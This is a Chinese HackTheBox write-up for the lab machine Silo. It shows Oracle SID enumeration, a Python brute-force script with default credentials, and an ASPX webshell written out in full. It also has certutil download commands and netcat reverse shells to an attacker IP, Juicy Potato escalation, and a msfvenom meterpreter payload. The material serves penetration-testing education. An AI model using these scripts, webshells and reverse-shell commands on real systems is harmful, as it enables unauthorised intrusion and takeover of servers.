Silo是一个中等难度的靶机，知识点涉及Oracle密码爆破、进程提权以及烂土豆提权等。感兴趣的同学可以在HackTheBox中进行学习。

![截屏2021-10-13
下午4.41.45](https://image.3001.net/images/20220401/1648747224_6245e2d8c1c16a6fe1ced.png!small)  
 _通关思维导图_  
![Silo](https://image.3001.net/images/20220401/1648747227_6245e2db07dcf59c62abd.png!small)

## 0x01 侦查

### 端口探测

首先使用 nmap 对目标进行端口扫描

    
    
    nmap -p- -sV -sC -A -T4 10.10.10.82 -oA nmap_Silo
    

![截屏2021-10-13
下午5.24.41](https://image.3001.net/images/20220401/1648747228_6245e2dc7b18ad163248f.png!small)  
![截屏2021-10-13
下午5.24.15](https://image.3001.net/images/20220401/1648747229_6245e2dda342f0462ba67.png!small)  
![截屏2021-10-13
下午5.23.34](https://image.3001.net/images/20220401/1648747230_6245e2dedc750484f1a7e.png!small)  
扫描结果显示目标开放了80、135、139、445、1521、5985等端口

#### 80端口

访问后发现为IIS的默认界面，通过目录扫描并未发现敏感目录  
![截屏2021-10-14
上午2.55.31](https://image.3001.net/images/20220401/1648747232_6245e2e009f0c30cdbe34.png!small)

#### 1521端口

1521端口默认为 Oracle 数据库，由于web端口并没有什么发现，那么 Oracle 就成了重点关注对象

### 获取SID

针对 Oracle 数据库我们需要首先获取目标的SID，这里介绍两种方法：MSF 以及 odat

#### odat获取SID

首先下载安装 sqlplus 和 odat

    
    
    apt install oracle-instantclient-sqlplus
    apt install odat
    

使用 odat 获取SID，扫描结果显示 SID 为`XE`、`XEXDB`

    
    
    odat sidguesser -s 10.10.10.82
    

![截屏2021-10-14
上午3.24.13](https://image.3001.net/images/20220401/1648747233_6245e2e14249db29f4faa.png!small)

#### MSF获取SID

    
    
    msfconsole
    msf > use auxiliary/admin/oracle/sid_brute
    msf > set rhosts 10.10.10.82
    msf > run
    

![截屏2021-10-14
上午3.35.07](https://image.3001.net/images/20220401/1648747235_6245e2e33e9057fb60c63.png!small)

扫描结果中可发现 SID 存在四个，分别是`XE`、`XEXDB`、`PLSExtProc`和`CLRExtProc`。相对于 odat 来说 MSF 发现
SID 明显更多

### 爆破Oracle数据库

爆破 Oracle 账号密码可以使用 MSF 、odat 中关于 Oracle 爆破的相关模块，当然也可以使用自写脚本

#### 自写脚本爆破

    
    
    #!/usr/bin/env python
    
    import cx_Oracle
    import sys
    from multiprocessing import Pool
    
    MAX_PROC = 50
    host = "10.10.10.82"
    sid = "XE"
    
    def usage():
        print("{} [ip] [wordlist]".format(sys.argv[0]))
        print("  wordlist should be of the format [username]:[password]")
        sys.exit(1)
    
    def scan(userpass):
        u, p = userpass.split(':')[:2]
        try:
            conn = cx_Oracle.connect('{user}/{pass_}@{ip}/{sid}'.format(user=u, pass_=p, ip=host, sid=sid))
            return u, p, True
        except cx_Oracle.DatabaseError:
            return u, p, False
    
    
    def main(host, userpassfile, nprocs=MAX_PROC):
        with open(userpassfile, 'r') as f:
           userpass = f.read().rstrip().replace('\r','').split('\n')
    
        pool = Pool(processes=nprocs)
    
        for username, pass_, status in pool.imap_unordered(scan, [up for up in userpass]):
            if status:
                print("Found {} / {}\n\n".format(username, pass_))
            else:
                sys.stdout.write("\r {}/{}                               ".format(username, pass_))
    
    if __name__ == '__main__':
        if len(sys.argv) != 3:
            usage()
        main(sys.argv[1], sys.argv[2])
    

除了脚本以外还需要构造字典，以下为 Oracle 数据库默认用户和默认密码，使用它作为字典辅助爆破  
![截屏2021-10-14
上午3.31.10](https://image.3001.net/images/20220401/1648747237_6245e2e5620bc8d90c9ab.png!small)

    
    
    sys:change_on_install
    system:manager
    sysman:oem_temp
    scott:tiger
    aqadm:aqadm
    Dbsnmp:dbsnmp
    

使用自写脚本进行爆破

    
    
    python3 brute.py 10.10.10.82 userpass.txt
    

![截屏2021-10-14
上午3.37.29](https://image.3001.net/images/20220401/1648747238_6245e2e646f2a561038c5.png!small)  
成功获得账号密码：`scott/tiger`、`Dbsnmp/dbsnmp`

#### MSF爆破

    
    
    msf > use auxiliary/admin/oracle/oracle_login
    msf > set rhosts 10.10.10.82
    msf > set sid XE
    msf > run
    

![截屏2021-10-14
上午4.05.58](https://image.3001.net/images/20220401/1648747239_6245e2e780413f7d724de.png!small)  
MSF也能够成功爆破出对应的账号密码

## 0x02 上线[defaultapppool]

### 数据库登录

使用 sqlplus 借助以上账号密码登录数据库

    
    
    sqlplus scott/tiger@10.10.10.82:1521/XE
    

![截屏2021-10-14
上午3.46.43](https://image.3001.net/images/20220401/1648747240_6245e2e8a494bfd02a082.png!small)

但是默认情况下 scott 用户不是 sysdba 角色，通过SQL语句查询当前权限也验证了这一结果

    
    
    select * from user_role_privs;
    

![截屏2021-10-14
上午3.48.56](https://image.3001.net/images/20220401/1648747242_6245e2ea142143dcbc076.png!small)

但是我们可以借助`as sysdba`命令进行权限提升

    
    
    sqlplus scott/tiger@10.10.10.82:1521/XE as sysdba
    

执行过后发现当前权限已为 sysdba  
![截屏2021-10-14
上午3.51.03](https://image.3001.net/images/20220401/1648747243_6245e2eb5a78b6845e997.png!small)

使用 odat 以 sysdba 权限查询 Oracle 数据库的利用点

    
    
    odat all -s 10.10.10.82 -d XE -U scott -P tiger --sysdba
    

![截屏2021-10-14
上午3.55.26](https://image.3001.net/images/20220401/1648747246_6245e2ee80a7de173c635.png!small)  
通过扫描结果可以发现目标存在tns投毒漏洞，与此同时我们还可以完成上传、下载文件等操作

### 上传木马

由于80端口为 IIS 的默认界面，那么猜测网站目录则为`c:\inetpub\wwwroot`，将asp版的 webshell 复制到当前目录下

    
    
    cp /usr/share/webshells/aspx/cmdasp.aspx .
    

使用 odat 上传 webshell

    
    
    odat dbmsadvisor -s 10.10.10.82 -d XE -U SCOTT -P tiger --sysdba --putFile C:\\inetpub\\wwwroot mac.aspx cmdasp.aspx
    

![截屏2021-10-14
上午4.13.48](https://image.3001.net/images/20220401/1648747249_6245e2f15df19f05b26d9.png!small)

但是访问后返回404  
![截屏2021-10-14
上午4.13.39](https://image.3001.net/images/20220401/1648747250_6245e2f267403d965a0c1.png!small)

猜测可能原因是 webshell 超过了其大小限制，我们可将其压缩

    
    
    cat cmdasp.aspx | tr -d '\n'
    

![截屏2021-10-14
上午4.18.12](https://image.3001.net/images/20220401/1648747251_6245e2f363cbd4474cb0f.png!small)

压缩后再次上传，使用 sqlplus 进行上传

    
    
    SQL> exec utlwritefile('C:/inetpub/wwwroot', 'shell1.aspx', '<%@ Page Language="C#" Debug="true" Trace="false" %><%@ Import Namespace="System.Diagnostics" %><%@ Import Namespace="System.IO" %><script Language="c#" runat="server">void Page_Load(object sender, EventArgs e){}string ExcuteCmd(string arg){ProcessStartInfo psi = new ProcessStartInfo();psi.FileName = "cmd.exe";psi.Argumentsc "+arg;psi.RedirectStandardOutput = true;psi.UseShellExecute = false;Process p = Process.Start(psi);StreamReader stmrdr = p.StandardOutput;string s = stmrdr.ReadToEnd();stmrdr.Close();return s;}void cmdExe_Click(object sender, System.EventArgs e){Response.Write("<pre>");Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));Response.Write("</pre>");}</script><HTML><bodyasp:TextBox id="txtArg" runat="server" Width="250px"></asp:TextBox><asp:Button id="testing" runat="server" Text="excute" OnClick="cmdExe_Click"></asp:Button><asp:Label id="lblText" runat="server">Command:</asp:Label></form></body></HTML>');
    

![截屏2021-10-14
上午4.34.00](https://image.3001.net/images/20220401/1648747252_6245e2f46ce910ada93e6.png!small)

结果还是显示失败，原来是上传命令存在问题，可使用 dbmsxslprocessor 来进行上传

    
    
    odat dbmsxslprocessor -s 10.10.10.82 -U scott -P tiger -d XE --putFile "C:\inetpub\wwwroot" "shell.aspx" "/usr/share/webshells/aspx/cmdasp.aspx" --sysdba
    

![截屏2021-10-14
上午4.31.56](https://image.3001.net/images/20220401/1648747253_6245e2f5c76b89ac391fe.png!small)

成功访问木马文件  
![截屏2021-10-14
上午4.35.35](https://image.3001.net/images/20220401/1648747254_6245e2f6b37b657934703.png!small)

### 反弹shell

上传 nc至服务器，首先需要在本地开启 http 服务

    
    
    cp /usr/share/windows-resources/binaries/nc.exe .
    ls
    python -m SimpleHTTPServer 80
    

![截屏2021-10-14
上午4.39.15](https://image.3001.net/images/20220401/1648747255_6245e2f78003efea8912f.png!small)

在本地监听6666端口

    
    
    nc -nvlp 6666
    

通过 webshell 执行命令完成反弹

    
    
    certutil.exe -urlcache -f http://10.10.14.7/nc.exe C:\WINDOWS\TEMP\nc.exe
    C:\WINDOWS\TEMP\nc.exe 10.10.14.7 6666 -e cmd.exe
    

![截屏2021-10-14
上午4.42.54](https://image.3001.net/images/20220401/1648747256_6245e2f84b8c838fda79b.png!small)

成功反弹shell，在当前用户桌面上成功找到第一个flag

    
    
    dir c:\Users\Phineas\Desktop
    type c:\Users\Phineas\Desktop\user.txt
    

![截屏2021-10-14
上午4.45.44](https://image.3001.net/images/20220401/1648747257_6245e2f93d505682435a2.png!small)

同时桌面上还存在名为`Oracle issue.txt`文件，查看后发现其中包含一个密码

    
    
    type "c:\Users\Phineas\Desktop\Oracle issue.txt"
    

![截屏2021-10-15
上午12.17.46](https://image.3001.net/images/20220401/1648747258_6245e2fa4919d4db992d3.png!small)

## 0x03 权限提升[system]

### 手工内核提权

获取系统信息发现目标为 Windows Server 2012  
![截屏2021-10-14
上午4.47.03](https://image.3001.net/images/20220401/1648747259_6245e2fb54c3847c6d454.png!small)

使用 Windows-Exploit-Suggester 查找相关漏洞

    
    
    python windows-exploit-suggester.py --database 2021-05-18-mssb.xls  --systeminfo systeminfo.txt
    

![截屏2021-10-14
上午4.49.52](https://image.3001.net/images/20220401/1648747262_6245e2fe8a1fba784d77a.png!small)

和之前一样，还是优先选择烂土豆（Juicy Potato）进行提权，在本地开启nc监听

    
    
    nc -nvlp 4444
    

靶机中输入命令传输提权程序并执行

    
    
    certutil.exe -urlcache -f http://10.10.14.7/nc.exe C:\WINDOWS\TEMP\nc.exe
    certutil.exe -urlcache -f http://10.10.14.7/JuicyPotato.exe C:\WINDOWS\TEMP\JuicyPotato.exe
    C:\WINDOWS\TEMP\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c C:\WINDOWS\TEMP\nc.exe -e cmd.exe 10.10.14.7 4444" -t *
    

![截屏2021-10-14
上午5.00.49](https://image.3001.net/images/20220401/1648747265_6245e30133024644092d7.png!small)  
![截屏2021-10-14
上午5.01.04](https://image.3001.net/images/20220401/1648747266_6245e302b722bb81ce90d.png!small)

成功拿到 system 权限，在管理员桌面下寻找第二个flag

    
    
    dir c:\Users\Administrator\Desktop
    type c:\Users\Administrator\Desktop\root.txt
    

![截屏2021-10-14
上午5.03.13](https://image.3001.net/images/20220401/1648747267_6245e303def2f99541879.png!small)  
成功获取到第二个flag

### Oracle进程提权

#### 判断Oracle运行权限

除了内核提权外还可以通过 Oracle 权限进行反弹，查看进程

    
    
    tasklist /v
    

![截屏2021-10-15
上午12.39.06](https://image.3001.net/images/20220401/1648747269_6245e30521134406a0df9.png!small)

在进程中并未发现 Oracle 进程由哪个用户运行，但是我们可以尝试读取`root.txt`

    
    
    odat ctxsys -s 10.10.10.82 -d XE -U SCOTT -P tiger --sysdba --getFile c:\\users\\administrator\\desktop\\root.txt
    

![截屏2021-10-15
上午12.40.25](https://image.3001.net/images/20220401/1648747270_6245e306541c6acb7065b.png!small)  
结果显示可以读取 root.txt，说明 Oracle 进程为管理员权限及以上

#### 借助MSF提权

使用 msfvenom 生成 exe 形式反弹木马

    
    
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=7777 -f exe -o shell.exe
    

![截屏2021-10-15
上午1.07.43](https://image.3001.net/images/20220401/1648747271_6245e30750346a78e65a1.png!small)

使用 odat 上传木马并执行

    
    
    odat utlfile -s 10.10.10.82 -U SCOTT -P tiger -d XE --sysdba --putFile \\TEMP shell.exe ~/hackthebox/Silo/shell.exe 
    odat externaltable -s 10.10.10.82 -U SCOTT -P tiger -d XE --sysdba --exec \\TEMP shell.exe
    

![截屏2021-10-15
上午1.07.54](https://image.3001.net/images/20220401/1648747272_6245e3080f7b169c1eea9.png!small)  
![截屏2021-10-15
上午1.08.02](https://image.3001.net/images/20220401/1648747272_6245e308dcc5d2695edf0.png!small)

在本地监听7777端口后成功获得系统权限

    
    
    msfconsole
    msf > use exploit/multi/handler
    msf > set payload windows/x64/meterpreter/reverse_tcp
    msf > set lhost 10.10.14.7
    msf > set lport 7777
    msf > run 
    

![截屏2021-10-15
上午1.06.51](https://image.3001.net/images/20220401/1648747273_6245e309b4f449c96893a.png!small)

**总结：该靶机主要围绕Oracle数据进行利用，如果要对Oracle数据库进行爆破说先要获取SID，使用odat拿到SID后以默认账号密码为字典可成功爆破数据库。使用爆破成功的账号密码登录数据库，将数据库用户提升为sysdba，根据IIS可推测站点的默认路径并将木马写入站点其中，通过木马执行反弹shell可成功获取用户权限。在靶机中存在两个利用店，一是使用老生常谈的烂土豆进行内核提权可直接拿到系统权限；二是使用odat借助系统权限的Oracle进程可完成系统提权。**

